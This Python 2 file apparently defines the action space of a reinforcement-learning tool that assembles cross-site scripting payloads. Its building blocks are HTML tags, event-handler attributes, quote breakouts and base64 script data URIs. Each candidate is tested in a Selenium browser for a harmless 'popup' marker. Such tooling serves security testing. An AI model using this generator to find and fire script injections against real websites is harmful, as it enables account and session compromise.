import os
import re
import md5
import json
import nf_shared
import subprocess
import numpy as np

from urlparse import urlparse
from selenium.common.exceptions import WebDriverException
from selenium.webdriver.common.keys import Keys


ACTIONS = []

class HackAction(object):
    dependent_dims = {}
    dependency_dims = []
    reward = -1
    def __init__(self, s):
        self.string = s or ''

    def hash_string(self, s):
        m = md5.new()
        m.update(s)
        return(m.hexdigest())

    def is_valid(self, s):
        good_to_go = True
        for dim_name, required_dim_value in self.dependent_dims.items():
            state_dim_value = s[dim_name]
            if state_dim_value == 0 or not re.search(required_dim_value, state_dim_value):
                good_to_go = False
                break
        return good_to_go

    def run(self, sink, taint, state):
        injection_index = sink.index(taint)
        sink = sink[:injection_index] + self.string + sink[injection_index:]

        # nf_shared.browser.get("data:text/html," + sink.replace(taint, '<script>var popup = true;</script>'))
        try:
            nf_shared.browser.get("data:text/html,<script>var popup;</script>" + sink.replace(taint, ''))
            r = nf_shared.browser.execute_script('return popup;');
            alert = True if r == 1 else False
        except WebDriverException:
            alert = False
        return(sink, alert)

    def __str__(self):
        return(self.string)

    def __unicode__(self):
        return(self.string)



class AttrParamAction(HackAction):
    """
    Action representing a event handler
    """
    dependent_dims = {'context': 'attr_param'}

    def is_valid(self, s):
        good_to_go = True if 0 in [s['1_tag_' + str(i) + '_ap'] for i in range(1, 4)] else False
        for feature_name, feature_value in s.items():
            if feature_name.endswith("_ap") and feature_value == self.string:
                good_to_go = False
                break
        return(good_to_go and super(AttrParamAction, self).is_valid(s))


ATTR_PARAMS = ('onblur', 'onerror', 'src', 'onfocus', 'autofocus', 'onload', 'href', 'data', 'rel', 'srcset', 'open', 'ontoggle', 'onchange', 'onfocus', 'onclick', 'for', 'id', 'formaction')
for i in ATTR_PARAMS:
    ACTIONS.append(AttrParamAction(i))



class AttrValueAction(HackAction):
    """
    Action with attr value
    """
    dependent_dims = {"context": "attr_value_start_delim|attr_value$"}  # Either without delim or with delim
    def is_valid(self, s):
        good_to_go = True
        if s['context_helper'] in ATTR_PARAMS: # If one attr value is already present then no other ATTR value is needed
            for fname, fvalue in s.items():
                if fname != 'context_helper' and fvalue == s['context_helper']:
                    if not s[fname.replace('ap', 'av')]:
                        good_to_go = True
                    else:
                        good_to_go = False
                    break
        return(good_to_go and super(AttrValueAction, self).is_valid(s))

ATTR_VALUES = [
    'x',
    'popup=1;',
    'data:text/html;base64,PHNjcmlwdD5wb3B1cD0xOzwvc2NyaXB0Pg==',
    'data:svg/xml;base64,PHN2Zz48c2NyaXB0PnBvcHVwPTE7PC9zY3JpcHQ+PC9zdmc+',
    'import']
for i in ATTR_VALUES:
    ACTIONS.append(AttrValueAction(i))


class DataAction(HackAction):
    """
    Action with data
    """
    dependent_dims = {"context": "data"}
    pass

# DATA_VALUES = ['popup=1;']
DATA_VALUES = []
for i in DATA_VALUES:
    ACTIONS.append(DataAction(i))


def get_open_tags(s):
    stack = []
    for i in range(5, 0, -1):
        fname = str(i) + "_tag"
        fvalue = s[fname]
        if fvalue and fvalue not in SELF_CLOSING_TAGS:
            end_tag = False
            for j in range(3, 1, -1):
                param_fname = fname + "_" + str(j) + "_ap"
                value_fname = fname + "_" + str(j) + "_av"
                if s[param_fname] == "end" and s[value_fname] == 1:
                    end_tag = True
                    break
            if not end_tag:
                stack.append(fvalue)
            elif end_tag:
                if stack[-1] == fvalue:
                    stack.pop()
    return(stack)


class TagAction(HackAction):
    """
    Action representing a HTML tag
    """
    dependent_dims = {'context': 'tag_name'}

    def is_valid(self, s):  # To support closing tag only when there is an open tag with same name
        good_to_go = True
        if s['context'] == 'end_tag_name':
            good_to_go = False
            if self.string in get_open_tags(s):  # Don't use self closing tags with </
                good_to_go = True
        return(good_to_go and super(TagAction, self).is_valid(s))

# TAGS = ('a', 'abbr', 'acronym', 'address', 'applet', 'embed', 'object', 'area', 'article', 'aside', 'audio', 'b', 'base', 'basefont', 'bdi', 'bdo', 'big', 'blockquote', 'body', 'br', 'button', 'canvas', 'caption', 'center', 'cite', 'code', 'col', 'colgroup', 'colgroup', 'datalist', 'dd', 'del', 'details', 'dfn', 'dialog', 'dir', 'ul', 'div', 'dl', 'dt', 'em', 'embed', 'fieldset', 'figcaption', 'figure', 'figure', 'font', 'footer', 'form', 'frame', 'frameset', 'h1', 'h6', 'head', 'header', 'hr', 'html', 'i', 'iframe', 'img', 'input', 'ins', 'kbd', 'keygen', 'label', 'input', 'legend', 'fieldset', 'li', 'link', 'main', 'map', 'mark', 'menu', 'menuitem')
TAGS = ('button', 'embed', 'object', 'body', 'canvas', 'div', 'embed', 'form', 'frameset', 'iframe', 'img', 'input', 'option', 'select', 'audio', 'video', 'source', 'track', 'svg', 'link', 'picture')
# TAGS = ['body', 'figcaption', 'aside', 'dialog', 'main', 'figure', 'mark', 'menuitem', 'rt', 'footer', 'rp', 'meter', 'article', 'bdi', 'details', 'section', 'ruby', 'header', 'wbr', 'time', 'summary', 'progress', 'nav']
# TAGS = ['div', 'input', 'img', 'audio', 'video', 'body', 'object']
SELF_CLOSING_TAGS = ["area", "base", "br", "col", "embed", "hr", "img", "input", "keygen", "link", "meta", "param", "source", "track", "wbr"]
for i in TAGS:
    a = TagAction(i)
    ACTIONS.append(a)


class MasterControlAction(HackAction):
    """
    Action representing a control character
    """
    def is_valid(self, s):
        if s['context'] == 'attr_value_start_delim' or (s['context'] == 'attr_value_end_delim' and s['1_cc'] == self.string):
            return True
        return False

MASTER_CONTROL_CHARS = ['"', "'"]
# MASTER_CONTROL_CHARS = []
for i in MASTER_CONTROL_CHARS:
    a = MasterControlAction(i)
    ACTIONS.append(a)

MASTER_COUNTER_CONTROL_CHARS = {
    "'": "'",
    '"': '"',
}


class ControlAction(HackAction):
    """
    Action representing a control character
    """
    pass

class ForwardSlashControlAction(ControlAction):
    """
    Action representing a control character
    """
    def is_valid(self, s):
        good_to_go = True
        # Check if there atleast one tag to be closed because '/' after a < will start a close tag state
        if s['context'] == 'start_tag_name':
            good_to_go = False
            if len(get_open_tags(s)) > 0:
                good_to_go = True
        return(good_to_go and super(ForwardSlashControlAction, self).is_valid(s))

class SpaceControlAction(ControlAction):
    """
    Action representing a control character
    """
    def is_valid(self, s):
        good_to_go = True
        if s['context'] == 'attr_value_end_delim':
            good_to_go = False
            if s['1_cc'] not in MASTER_CONTROL_CHARS:
                good_to_go = True
        return(good_to_go and super(SpaceControlAction, self).is_valid(s))

class LessThanControlAction(ControlAction):
    """
    Action representing a control character
    """
    def is_valid(self, s):
        good_to_go = True
        if s['context'] in ['delim'] and s['5_tag'] != 0:  # If 5 tags are already there, no new tags
            good_to_go = False
        return(good_to_go and super(LessThanControlAction, self).is_valid(s))


CONTROL_CHARS = [' ', '(', ')', '*', '+', '-', ',', ';', '<', '>', '=', '[', ']', '{', '}', '`', '/']
CONTROL_CHARS = [' ', '<', '>', '/', '=']
CONTROL_CHARS = [' ', '<', '>', '/', '=']
for i in CONTROL_CHARS:
    a = ControlAction(i)
    if i == '>':
        a.dependent_dims = {'context': 'start_tag_attr|end_tag_attr|attr_param|equal_dim|attr_delim'}
    if i == '<':
        a = LessThanControlAction(i)
        a.dependent_dims = {'context': 'data'}
    elif i in [' ']:
        a = SpaceControlAction(i)
        a.dependent_dims = {'context': 'start_tag_attr|attr_delim|attr_value_end_delim'}
    elif i in ['/']:
        a = ForwardSlashControlAction(i)
        a.dependent_dims = {'context': 'start_tag_attr|start_tag_name'}
    elif i == '=':
        a.dependent_dims = {'context': 'equal_delim'}
    ACTIONS.append(a)

COUNTER_CONTROL_CHARS = {
    '(': ')',
    '[': ']',
    '{': '}',
    '`': '`'
}


class MouseKeyboardAction(object):
    reward = -30
    def __init__(self, s, action='click'):
        self.tag_num = s
        self.action = action

    def run(self, sink, taint, state):
        tag = state[str(self.tag_num) + "_tag"]
        previous_tags = [state[str(i) + "_tag"] for i in range(self.tag_num - 1, 1, -1)]
        i = previous_tags.count(tag)
        # nf_shared.browser.get("data:text/html," + sink.replace(taint, '<script>var popup = true;</script>'))
        try:
            nf_shared.browser.get("data:text/html,<script>var popup;</script>" + sink.replace(taint, ''))
            elements = nf_shared.browser.find_elements_by_tag_name(tag)
            e = elements[i]
            # Perform action
            if self.action == 'click':
                e.click()
            elif self.action == 'focus':
                e.send_keys(Keys.NULL)
            elif self.action == 'keyboard':
                e.send_keys("1337")
            r = nf_shared.browser.execute_script('return popup;');
            alert = True if r == 1 else False
        except WebDriverException:
            alert = False
        except IndexError:  # IndexError when selenium cannot find element
            alert = False
        return(sink, alert)

    def is_valid(self, s):
        good_to_go = False
        if s[str(self.tag_num) + "_tag"] != 0 and s[str(self.tag_num) + "_tag"] not in ['div', 'link', 'body']:
            good_to_go = True
            if self.tag_num == 1 and s['context'] != 'data':  # Or else click will happen when sink is incomplete i.e <button abcdef
                good_to_go = False
        return(good_to_go)

for a in ['click', 'focus', 'keyboard']:
    for i in range(1, 6):
        ACTIONS.append(MouseKeyboardAction(i, action=a))
